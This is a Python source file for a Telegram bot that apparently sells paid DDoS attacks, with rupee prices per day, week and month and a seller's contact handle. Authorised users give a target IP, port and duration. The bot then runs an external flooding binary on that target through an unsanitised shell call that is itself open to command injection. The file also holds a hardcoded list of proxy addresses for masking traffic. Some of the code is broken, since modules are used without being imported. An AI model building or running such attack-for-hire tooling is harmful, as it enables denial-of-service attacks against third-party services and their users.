import telebot
import subprocess
import datetime
import os
import time
import json
import shutil
from telebot import types
from threading import Timer, Thread
from requests.exceptions import ReadTimeout, ConnectionError

# Load configuration
CONFIG_FILE = 'config.json'

def update_proxy(): 
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)


config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config['admin_ids'])
USER_FILE = config['user_file']
LOG_FILE = config['log_file']
COOLDOWN_TIME = config['cooldown_time']
USER_COOLDOWN = 300  # Cooldown time for normal users in seconds

admin_balances = config.get('admin_balances', {})
bgmi_cooldown = {}
ongoing_attacks = {}
allowed_user_ids = {}
user_cooldowns = {}

# User management functions
def read_users():
    try:
        with open(USER_FILE, 'r') as f:
            users = json.load(f)
            return {user: datetime.datetime.fromisoformat(expiry) for user, expiry in users.items()}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def write_users(users):
    with open(USER_FILE, 'w') as f:
        json.dump({user: expiry.isoformat() for user, expiry in users.items()}, f)

allowed_user_ids = read_users()

def check_expired_users():
    current_time = datetime.datetime.now()
    expired_users = [user for user, expiry in allowed_user_ids.items() if expiry < current_time]
    for user in expired_users:
        del allowed_user_ids[user]
    if expired_users:
        write_users(allowed_user_ids)

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"UserID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.truncate(0)
        return "Logs cleared successfully ‚úÖ"
    return "Logs are already cleared. No data found."

# Bot command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_message = (
        "üî∞ ùó™ùóòùóüùóñùó¢ùó†ùóò ùóßùó¢ ùóóùóòùó¶ùóú ùóõùóîùóñùóû ùóóùóóùó¢ùó¶ ùóïùó¢ùóß üî∞\n\n" )

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_attack = types.KeyboardButton('üöÄ Attack')
    btn_info = types.KeyboardButton('‚ÑπÔ∏è My Info')
    btn_access = types.KeyboardButton('üí∞ Buy Access!')
    btn_rules = types.KeyboardButton('üî∞ Rules')
    
    markup.add(btn_attack, btn_info, btn_access, btn_rules)
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Bot command handlers
import shutil

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in ADMIN_IDS:
        args = message.text.split()
        admin_user = bot.get_chat(message.chat.id)
        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
        if len(args) == 3:
            user_id, duration = args[1], int(args[2])
            cost = duration * 100
            if admin_balances[str(message.chat.id)] >= cost:
                expiry_time = datetime.datetime.now() + datetime.timedelta(days=duration)
                allowed_user_ids[user_id] = expiry_time
                write_users(allowed_user_ids)
                admin_balances[str(message.chat.id)] -= cost
                config['admin_balances'] = admin_balances
                write_config(config)
                

                response = f"User {user_id} added successfully for {duration} days by {admin_username} üëç. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        elif len(args) == 4 and args[2] == 'hours':
            user_id, hours = args[1], int(args[3])
            duration = hours / 24  # Convert hours to days for costing
            cost = int(duration * 100)
            if admin_balances[str(message.chat.id)] >= cost:
                expiry_time = datetime.datetime.now() + datetime.timedelta(hours=hours)
                allowed_user_ids[user_id] = expiry_time
                write_users(allowed_user_ids)
                admin_balances[str(message.chat.id)] -= cost
                config['admin_balances'] = admin_balances
                write_config(config)

                response = f"User {user_id} added successfully for {hours} hours by {admin_username} üëç. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        else:
            response = "Usage: /add <userId> <duration_in_days> or /add <userId> hours <duration_in_hours>"
    else:
        response = "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) in ADMIN_IDS:
        args = message.text.split()
        admin_user = bot.get_chat(message.chat.id)
        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
        if len(args) > 1:
            user_id = args[1]
            if user_id in allowed_user_ids:
                del allowed_user_ids[user_id]
                write_users(allowed_user_ids)
                response = f"User ID: {user_id} removed Successfully by {admin_username}."
            else:
                response = f"User {user_id} Not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
    else:
        response = "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    response = clear_logs() if str(message.chat.id) in ADMIN_IDS else "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if str(message.chat.id) in ADMIN_IDS:
        if allowed_user_ids:
            response_lines = []
            for user_id, expiry in allowed_user_ids.items():
                try:
                    user = bot.get_chat(int(user_id))
                    username = f"@{user.username}" if user.username else f"User ID: {user_id}"
                    response_lines.append(f"- {username} - Expires: {expiry}")
                except Exception as e:
                    response_lines.append(f"- User ID: {user_id} - Expires: {expiry} (Error fetching username: {e})")
            response = "Authorized Users:\n" + "\n".join(response_lines)
        else:
            response = "No data found."
    else:
        response = "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if str(message.chat.id) in ADMIN_IDS:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, "No data found.")
    else:
        bot.send_message(message.chat.id, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.send_message(message.chat.id, f"ü§ñYour ID: {str(message.chat.id)}")

# Attack functionality
def start_attack(user_id, target, port, duration):
    attack_id = f"{user_id} {target} {port}"
    user = bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else f"UserID: {user_id}"
    log_command(user_id, target, port, duration)
    response = f"üöÄ ùóîùòÅùòÅùóÆùó∞ùó∏ ùó¶ùó≤ùóªùòÅ ùó¶ùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ! üöÄ\n\nùóßùóÆùóøùó¥ùó≤ùòÅ: {target}:{port}\nùóîùòÅùòÅùóÆùó∞ùó∏ ùóßùó∂ùó∫ùó≤: {duration}\nùóîùòÅùòÅùóÆùó∞ùó∏ùó≤ùóø ùó°ùóÆùó∫ùó≤: {username}"
    bot.send_message(user_id, response)
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./DESI {target} {port} {duration}", shell=True)
        time.sleep(5)
      # Set cooldown for normal users after a successful attack
        if user_id not in ADMIN_IDS:
            user_cooldowns[user_id] = datetime.datetime.now()
    except Exception as e:
        bot.send_message(user_id, f"Error: Servers Are Busy Unable To Attack\n{e}")

@bot.message_handler(func=lambda message: message.text == 'üöÄ Attack')
def handle_attack_button(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        bot.send_message(message.chat.id, "Enter the target ip, port and duration in seconds separated by space")
        bot.register_next_step_handler(message, handle_attack_details)
    else:
        bot.send_message(message.chat.id, "üö´ ùó®ùóªùóÆùòÇùòÅùóºùóøùó∂ùòÄùó≤ùó± ùóîùó∞ùó∞ùó≤ùòÄùòÄ! üö´\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\nüëâ Contact an Admin or the Owner for approval.\nüåü Become a proud supporter and purchase approval.\nüí¨ Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")

def handle_attack_details(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            target, port, duration = message.text.split()
            duration = int(duration)

            MAX_DURATION = 240
            if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                bot.send_message(message.chat.id, f"‚ùóÔ∏èùóòùóøùóøùóºùóø: ùó†ùóÆùòÖùó∂ùó∫ùòÇùó∫ ùó®ùòÄùóÆùó¥ùó≤ ùóßùó∂ùó∫ùó≤ ùó∂ùòÄ {MAX_DURATION} ùó¶ùó≤ùó∞ùóºùóªùó±ùòÄ‚ùóÔ∏è")
                return

            if user_id not in ADMIN_IDS:
                if user_id in user_cooldowns:
                    elapsed_time = (datetime.datetime.now() - user_cooldowns[user_id]).total_seconds()
                    if elapsed_time < USER_COOLDOWN:
                        cooldown_remaining = int(USER_COOLDOWN - elapsed_time)
                        bot.send_message(message.chat.id, f"ùóñùóºùóºùóπùó±ùóºùòÑùóª ùó∂ùóª ùóòùó≥ùó≥ùó≤ùó∞ùòÅ. ùó£ùóπùó≤ùóÆùòÄùó≤ ùó™ùóÆùó∂ùòÅ {cooldown_remaining} ùó¶ùó≤ùó∞ùóºùóªùó±ùòÄ")
                        return
            thread = Thread(target=start_attack, args=(user_id, target, port, duration))
            thread.start()
        except ValueError:
            bot.send_message(message.chat.id, "ùóúùóªùòÉùóÆùóπùó∂ùó± ùóôùóºùóøùó∫ùóÆùòÅùó≤")
    else:
        bot.send_message(message.chat.id, "üö´ ùó®ùóªùóÆùòÇùòÅùóºùóøùó∂ùòÄùó≤ùó± ùóîùó∞ùó∞ùó≤ùòÄùòÄ! üö´")

@bot.message_handler(func=lambda message: message.text == '‚ÑπÔ∏è My Info')
def handle_my_info_button(message):
    user_id = str(message.chat.id)
    expiry = allowed_user_ids.get(user_id)
    user = bot.get_chat(int(user_id))
    username = f"@{user.username}" if user.username else "No username available"
    role = "Admin" if user_id in ADMIN_IDS else "User"
    balance = admin_balances.get(user_id, "Not Approved")
    response = (f"‚ÑπÔ∏è ùó®ùó¶ùóòùó• ùóúùó°ùóôùó¢ùó•ùó†ùóîùóßùóúùó¢ùó° ‚ÑπÔ∏è\n\n"
                f"- Role: {role}\n"
                f"- User ID: {user_id}\n"
                f"- Username: {username}\n"
                f"- Approval Expiry: {expiry if expiry else 'N/A'}\n"
                f"- Balance Rs: {balance} INR.")
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text == 'üí∞ Buy Access!')
def handle_buy_access_button(message):
    response = (f"üîÜ DESIHACK ùêáùêîùêÅ ùêÉùêÉùêéùêí ùêèùêëùêàùêÇùêÑ ùêãùêàùêíùêì üîÜ\n\nùñ£ùñ†ùñ∏ - 150/-ùñ®ùñ≠ùñ±\nùñ∂ùñ§ùñ§ùñ™ - 600/-ùñ®ùñ≠ùñ±\nùñ¨ùñÆùñ≠ùñ≥ùñß - 1200/-ùñ®ùñ≠ùñ±\n\nDM TO BUY @LION_DEEPAK")
    bot.send_message(message.chat.id, response)


@bot.message_handler(func=lambda message: message.text == 'üî∞ Rules')
def handle_rules_button(message):
    response = (f"ùüè. ùêÉùê®ùêß‚Äôùê≠ ùêíùê©ùêöùê¶ ùêìùê®ùê® ùêåùêöùêßùê≤ ùêÄùê≠ùê≠ùêöùêúùê§ùê¨ !! ùêÇùêöùêÆùê¨ùêû ùêÄ ùêÅùêöùêß ùêÖùê´ùê®ùê¶ ùêÅùê®ùê≠.\n\nùüê. ùêÉùê®ùêß‚Äôùê≠ ùêëùêÆùêß ùüê ùêÇùê®ùê¶ùê¶ùêöùêßùê¨ ùêÄùê≠ ùêíùêöùê¶ùêû ùêìùê¢ùê¶ùêû.\n\nùüë. ùêåùêöùê§ùêû ùêíùêÆùê´ùêû ùêòùê®ùêÆ ùêâùê®ùê¢ùêßùêûùêù  ùêéùêÆùê´ ùêúùê°ùêöùêßùêßùêûùê• ùêéùê≠ùê°ùêûùê´ùê∞ùê¢ùê¨ùêû ùêìùê°ùêû ùêÉùêÉùê®ùêí ùêñùê¢ùê•ùê• ùêçùê®ùê≠ ùêñùê®ùê´ùê§.\n\nùüí. ùêñùêû ùêÉùêöùê¢ùê•ùê≤ ùêÇùê°ùêûùêúùê§ùê¨ ùêìùê°ùêû ùêãùê®ùê†ùê¨ ùêíùê® ùêÖùê®ùê•ùê•ùê®ùê∞ ùê≠ùê°ùêûùê¨ùêû ùê´ùêÆùê•ùêûùê¨ ùê≠ùê® ùêöùêØùê®ùê¢ùêù ùêÅùêöùêß!")
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.chat.id) in ADMIN_IDS:
        args = message.text.split(maxsplit=1)
        if len(args) == 2:
            broadcast_message(args[1])
        else:
            bot.send_message(message.chat.id, "Please provide a message to broadcast. Usage: /broadcast <message>")
    else:
        bot.send_message(message.chat.id, "ONLY OWNER CAN USE.")

def broadcast_message(msg):
    for user_id in allowed_user_ids:
        try:
            bot.send_message(user_id, msg)
        except Exception as e:
            print(f"Error sending message to {user_id}: {e}")

# Main loop
if __name__ == '__main__':
    check_expired_users()
    Timer(86400, check_expired_users).start()  # Run check_expired_users every 24 hours
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)  # Increased timeout value
        except ReadTimeout:
            print("ReadTimeout occurred. Retrying...")
        except ConnectionError:
            print("ConnectionError occurred. Retrying...")
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(1)
            